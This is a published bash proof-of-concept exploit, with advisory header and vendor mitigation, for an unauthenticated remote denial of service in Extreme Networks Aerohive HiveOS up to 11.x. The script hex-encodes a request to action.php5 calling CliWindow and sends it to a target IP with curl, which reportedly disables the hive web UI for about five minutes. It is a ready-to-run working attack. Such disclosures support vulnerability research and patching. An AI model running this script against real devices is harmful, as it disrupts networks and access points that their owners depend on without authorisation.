# Exploit title : Extreme Networks Aerohive HiveOS 11.0 - Remote Denial of Service (PoC)
# Exploit Author : LiquidWorm
# Date : 2020-05-06
# Vendor: Extreme Networks
# Product web page: https://www.extremenetworks.com
# Datasheet: https://www.aerohive.com/wp-content/uploads/Aerohive_Datasheet_HiveOS.pdf
# Affected version: <=11.x

#!/bin/bash
#
#
# Extreme Networks Aerohive HiveOS <=11.x Remote Denial of Service Exploit
#
#
# Vendor: Extreme Networks
# Product web page: https://www.extremenetworks.com
# Datasheet: https://www.aerohive.com/wp-content/uploads/Aerohive_Datasheet_HiveOS.pdf
# Affected version: <=11.x
#
# Summary: Aerohive HiveOS is the network operating system that powers
# all Aerohive access points, based on a feature-rich Cooperative Control
# architecture. HiveOS enables Aerohive devices to organize into groups,
# or 'hives', which allows functionality like fast roaming, user-based
# access control and fully stateful application-aware firewall policies,
# as well as additional security and RF networking features - all without
# the need for a centralized or dedicated controller.
#
# Desc: An unauthenticated malicious user can trigger a Denial of Service
# (DoS) attack when sending specific application layer packets towards the
# Aerohive NetConfig UI. This PoC exploit renders the application unusable
# for 305 seconds or 5 minutes with a single HTTP request using the action.php5
# script calling the CliWindow function thru the _page parameter, denying
# access to the web server hive user interface.
#
# Vendor mitigation:
# CLI> no system web-server hive-ui enable
#
# Tested on: Hiawatha v9.6
#
#
# Vulnerability discvered by Gjoko 'LiquidWorm' Krstic
#                            @zeroscience
#
#
# Advisory ID: ZSL-2020-5566
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5566.php
#
#
# 05.12.2019
#

if [ "$#" -ne 1 ]; then
	echo -ne "\nUsage: $0 [ipaddr]\n\n"
	exit
fi

IP=$1

SBYTES=`echo -e \
"\x61\x63\x74\x69\x6f\x6e\x2e"\
"\x70\x68\x70\x35\x3f\x5f\x70"\
"\x61\x67\x65\x3d\x43\x6c\x69"\
"\x57\x69\x6e\x64\x6f\x77\x26"\
"\x5f\x61\x63\x74\x69\x6f\x6e"\
"\x3d\x67\x65\x74\x26\x5f\x61"\
"\x63\x74\x69\x6f\x6e\x54\x79"\
"\x70\x65\x3d\x31"`##_000000251

curl -vk "https://$IP/$SBYTES" --user-agent "Profesorke/Dzvoneshe"